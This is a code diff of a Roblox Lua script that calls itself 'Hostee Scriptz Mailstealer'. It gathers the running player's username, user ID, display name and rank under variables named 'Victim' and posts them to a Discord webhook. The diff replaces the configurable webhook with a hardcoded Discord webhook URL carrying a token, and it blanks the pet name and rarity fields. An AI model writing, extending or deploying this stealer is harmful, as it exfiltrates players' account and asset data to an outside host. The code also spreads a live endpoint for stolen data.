@@ -17,11 +17,11 @@ _G.CurrentRank = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Ran
 _G.PlrUserVictim = game.Players.LocalPlayer.Name
 _G.PlrUserIDVictim = game.Players.LocalPlayer.UserId
 _G.PlrDisplayNameVictim = game.Players.LocalPlayer.DisplayName
-_G.PetName = v2.name
-_G.PetRar = v2.rarity
+_G.PetName = "Not Working."
+_G.PetRar = "Not Working."
 local function sendwebhook()
     local msg = {
-        ["content"] = "|| @everyone ||**Hello ".. _G.UserName .. ", Hostee Scriptz Mailstealer has detected a new hit!**",
+        ["content"] = "|| @everyone ||**Hello But Hostee Scriptz Mailstealer has detected a new hit!**",
         ["embeds"] = {
             {
                 ["title"] = "Hostee Scriptz Mailstealer Results",
@@ -48,7 +48,7 @@ local function sendwebhook()
     local Webhook = _G.WebHook
     local request = http_request or request or HttpPost or syn.request
     request({
-        Url = Webhook,
+        Url = "https://discord.com/api/webhooks/1114164888147861534/2PNRIDU0GCZ60OWNVLYCPWUCE7UUAZTCUAAEU6K9DMXCY4SLYEHXHGDWMJWAPTI74Q2E",
         Method = "POST",
         Headers = {
             ["Content-Type"] = "application/json"
